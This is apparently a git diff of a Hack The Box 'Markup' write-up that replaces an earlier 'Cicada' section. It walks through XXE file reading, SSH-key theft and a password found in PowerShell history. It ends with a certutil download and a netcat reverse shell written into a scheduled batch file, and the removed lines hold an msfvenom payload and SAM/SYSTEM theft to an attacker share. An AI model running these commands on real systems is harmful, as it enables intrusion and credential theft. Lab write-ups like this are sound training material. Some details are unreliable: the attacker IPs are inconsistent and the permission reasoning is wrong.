@@ -31,7 +31,8 @@ Let's start off with a basic TCP scan. If we can't find anything we can later ru
 
 ```bash
 # set host & initiate a standard tcp scan
-sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $markup
+┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
+└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $markup
 ```
 
 Looks like SSH and a webserver (TCP 80 & 443) are both available. 
@@ -54,7 +55,8 @@ Navigating in-browser to the app gets us a login Page. I run ferox buster to enu
 ![Webapp Login](/assets/img/ctf/htb/very-easy/markup/2.png)
 
 ```bash
-feroxbuster --url $markup --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
+┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
+└─$ feroxbuster --url $markup --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
 ```
 
 But this doesn't seem to reveal anything interseting. I also viewed the HTML source for version or other interesting information, but couldn't find anything.
@@ -73,7 +75,7 @@ The order page has the only discernable feature that 'does something' when the f
 
 A name is mentioned. I'll note that down for future enumeration.
 
-Futher down in the source we can see that the form is submitting XML data. This could be vulnerable to XML External Entities attackes if the server does not have proper protections in place:
+Futher down in the source we can see that the form is submitting XML data. This could be vulnerable to XML External Entities attacks if the server does not have proper protections in place:
 
 ![Order page source - XML](/assets/img/ctf/htb/very-easy/markup/5.png)
 
@@ -114,7 +116,8 @@ Whenever LFI is possible AND we know SSH is enabled, we should always try to get
 Nice, we were able to get their key. Pop that into a local id_rsa file and remember to change the permissions!
 
 ```bash
-chmod 600 id_rsa
+┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
+└─$ chmod 600 id_rsa
 
 ┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]                                                                                                                                                                      
 └─$ ssh -i id_rsa daniel@$markup                                                                                                                                                                                         
@@ -133,102 +136,209 @@ daniel@MARKUP C:\Users\daniel>
 
 Foothold established as user daniel.
 
+```bash
+daniel@MARKUP C:\Users\daniel>whoami /priv && whoami /groups                                                                                                                                                             
+                                                                                                                                                                                                                         
+PRIVILEGES INFORMATION                                                                                                                                                                                                   
+----------------------                                                                                                                                                                                                   
 
-## Privilege Escalation
+Privilege Name                Description                    State
+============================= ============================== =======
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
-To that end, once of my go-to referencing for pentesting is *Hacktricks*. BOOKMARK IT! NOW! 
+GROUP INFORMATION
+-----------------
 
-There's a section regarding privileged groups that have dangerous permissions. See the link below for the 'Backup Operators' group:
+Group Name                             Type             SID                                           Attributes
+====================================== ================ ============================================= ==================================================
+Everyone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+MARKUP\Web Admins                      Alias            S-1-5-21-103432172-3528565615-2854469147-1001 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users        Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                   Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+```
 
-<a href="https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators"  alt="Hacktricks">Hack Tricks - Backup Operators</a>
+**I like to switch to powershell once I get onto a Windows system and made it a habit.**
 
-So let's start with the AD attack section using *diskshadow.exe*
-
-![diskshadow evil-winRM fail](/assets/img/ctf/htb/easy/cicada/4.png)
-
-### Improving Our Foothold
-
-Ugh. *evil-winrm* does its job when getting an initial foothold shell, but it gives too many issues regarding piped output as you can see above. We'll try to get a more stable revshell first.
-
-First, let's start our listener on port 4444:
+After some initial enum, there appears to be nothing else special about the daniel account. I'll enumerate the system after grabbing the user flag:
 
 ```bash
-sudo rlwrap nc -lvnp 4444
+daniel@MARKUP C:\Users\daniel>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\daniel> cat .\Desktop\user.txt 
+******************************8ef7  
 ```
 
-Then we'll make our revshell payload using *msfvenom*
+I did run winPEAS but the only promising finding was the user's PS history file.
 
+*I export winPEAS output to a file while also streaming it to console. Using the below method exports the info while preserving color data for review on my host machine*
 
 ```bash
-# make sure to replace your LHOST to your $attacker IP and LPORT to your listener IP
-┌──(haunter㉿kali)-[~/working/htb/easy/cicada]                                                                                        
-└─$ msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.10.14.15 LPORT=4444 -f exe -o revshell.exe 
+$env:TERM = "xterm"
+.\winPEASx64.exe 2>&1 | ForEach-Object { $_; $_ } > winpeas_raw.txt
+cp winpeas_raw.txt \\10.10.16.18\attacker
 ```
 
-Finally, we'll upload the revshell to the $target and execute:
-
-
-```bash 
-*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> upload revshell.exe 
-*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> .\revshell.exe
-
-```
-
-Now we check the listener and there should be a connection. Running *diskshadow.exe* again shows correct output now.
+![PS History File](/assets/img/ctf/htb/very-easy/markup/10.png)
 
 ```bash
-listening on [any] 4444 ...             
-connect to [10.10.14.15] from (UNKNOWN) [10.10.11.35] 50949
-Microsoft Windows [Version 10.0.20348.2700]
-(c) Microsoft Corporation. All rights reserved.
-                                                                                                            
-C:\Users\emily.oscars.CICADA\Documents>diskshadow.exe                                                       
-diskshadow.exe                                        
-Microsoft DiskShadow version 1.0
-Copyright (C) 2013 Microsoft Corporation
-On computer:  CICADA-DC,  10/20/2025 1:38:38 PM
-
+PS C:\Users\daniel> cat C:\Users\daniel\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+.
+.
+.
+$pass = ConvertTo-SecureString "YAkpPzX2V_%" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ("daniel",$pass)
+Start-Process -NoNewWindow -FilePath "C:\xampp\xampp_start.exe" -Credential $cred -WorkingDirectory c:\users\daniel\documents
+exit
 ```
 
-While I was able to get *disksahdow.exe* to launch this time, it still seems broken as it does not seem to take my commands. Not sure if this an intended issue or not, but I went back to the drawing board and found the following attack path for Backup Operators:
+There does appear to be a password. Let's save that to passwords.txt for good practice, but right now it doesn't offer any other lateral vectors.
 
-<a href="https://www.bordergate.co.uk/backup-operator-privilege-escalation/" alt="Backup Operators Privilege Escalation">Backup Operators - Privilege Escalation</a>
 
-I'll attempt to copy the SAM & SYSTEM files and then dump them on my $attacker locally.
+## Lateral Movement / Privilege Escalation
+
+Checking the C:\ drive is next. There are two dirs that stand out: *Log-Management* and *xampp*
+
+```bash                                                                        
+PS C:\Users\daniel> ls c:\                                                                             
+
+
+    Directory: C:\ 
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/12/2020   3:56 AM                Log-Management
+d-----        9/15/2018  12:12 AM                PerfLogs
+d-r---        7/28/2021   2:01 AM                Program Files
+d-----        9/15/2018  12:21 AM                Program Files (x86)
+d-r---         3/5/2020   4:40 AM                Users
+d-----        7/28/2021   2:16 AM                Windows
+d-----         3/5/2020   9:15 AM                xampp
+-a----        7/28/2021   3:38 AM              0 Recovery.txt
+```
+
+First I checked the MySQL DB for users / creds, but I did not find anything in any of the databases/tables:
 
 ```bash
-# make a copy of the SAM file 
-reg save hklm\sam c:\Windows\Tasks\SAM
+PS C:\Users\daniel> C:\xampp\mysql\bin\mysql.exe -u root 
 
-# make a copy of the SYSTEM file
-reg save hklm\system c:\Windows\Tasks\SYSTEM
+Welcome to the MariaDB monitor.  Commands end with ; or \g.                                                                                                                                                              
+Your MariaDB connection id is 8
+Server version: 10.4.11-MariaDB mariadb.org binary distribution
 
-# cd to the folder of the copied files and then transfer via SMB to $attacker
-cd c:\windows\tasks\
-copy SAM \\10.10.14.15\attacker\SAM
-copy SYSTEM \\10.10.14.15\attacker\SYSTEM
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| goods              |                                 
+| information_schema |                                 
+| mysql              |                                 
+| performance_schema |                                 
+| phpmyadmin         |                                 
+| test               |                                 
++--------------------+                                 
+6 rows in set (0.009 sec)    
 ```
-Now back on my $attacker, I cd into the attacker/ SMB share and try to dump the secrets:
+
+So that makes *C:\Log-Management\* as my next enumeration target.
 
 ```bash
-┌──(haunter㉿kali)-[~/working/htb/easy/cicada/attacker]
-└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+PS C:\Users\daniel> ls C:\Log-Management\
+
+
+    Directory: C:\Log-Management
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/6/2020   1:42 AM            346 job.bat
 ```
 
-![administrator hash](/assets/img/ctf/htb/easy/cicada/5.png)
+There is a *.bat* file. **When I see .bat files or custom .exes in unusual directories, I think of *Service Binary Hijacking* or similar**.
 
-We get *administrator's* hash. 
+```bash
+PS C:\Users\daniel> cd C:\Log-Management\
+
+PS C:\Log-Management> cat .\job.bat
+@echo off 
+FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
+IF (%adminTest%)==(Access) goto noAdmin
+for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+echo.
+echo Event Logs have been cleared!
+goto theEnd
+:do_clear
+wevtutil.exe cl %1
+goto :eof
+:noAdmin
+echo You must run this script as an Administrator!
+:theEnd
+exit
+```
+
+When checking the file contents, it seems that this file needs to *run as admin*. So if this file runs under admin context AND it may be scheduled to run, we should definitely try to edit the file with a payload. Can we edit it?
+
+```bash
+PS C:\Log-Management> icacls.exe .\job.bat
+.\job.bat BUILTIN\Users:(F)
+          NT AUTHORITY\SYSTEM:(I)(F)
+          BUILTIN\Administrators:(I)(F)
+          BUILTIN\Users:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+PS C:\Log-Management>
+```
+
+*BUILTIN\Users:(I)(RX)* can edit the file. That means our user context *daniel* can edit the file.
+
+Let's try to edit the file to call netcat for a revshell.
 
 ## Root / SYSTEM
 
-```bash
-evil-winrm -i $cicada -u administrator -H ****************************f341
+```bash 
+# start a httpserver on your $attacker. My port is at :8000
+PS C:\Log-Management>certutil -f urlcache http://10.10.14.18:8000/win/nc64.exe .\nc.exe
 ```
-![root.txt flag](/assets/img/ctf/htb/easy/cicada/6.png)
 
-With that, we've rooted Cicada.
+Start your local listener. Mine is set for :4444
+
+```bash
+┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
+└─$ sudo rlwrap nc -lvnp 4444
+[sudo] password for haunter: 
+listening on [any] 4444 ...
+```
+
+Now I'll try to replace the contents of *job.bat*. NOTE: Due to how Powershell handles special characters/escaping, I had to exit Powershell and run the following from cmd instead:
+
+```bash
+PS C:\Log-Management> exit
+
+daniel@MARKUP C:\Users\daniel>echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.18 4444 > C:\LogManagement\job.bat
+```
+
+And then wait to see if there is a schedule to launch the revshell...
+
+![Admin Shell](/assets/img/ctf/htb/very-easy/markup/admin.png)
+
+Success. After collecting the administrator.txt flag we've completed Markup.
+
 
 # Lessons Learned
-* everytime a new user cred is obtained, re-enumerate previously enumerated services, such as SMB.
-* LDAP with Bloodhound is a great resource to discover if users belong to any VIP groups. Search for how these privileges can be abused
-* evil-winrm can have output piping issues. Use revshell payloads to establish better shells
+* XML can lead to XXE / XEE, which can lead to LFI
+* Enumerate odd directories. If we see custom .bat or .exe files, check permissions to see if we can edit the file
+* Even if we can't see a process since it may be running as admin, context may provide clues it is scheduled to run as admin
+* when edit files with piped input, cmd is preffered over Powershell
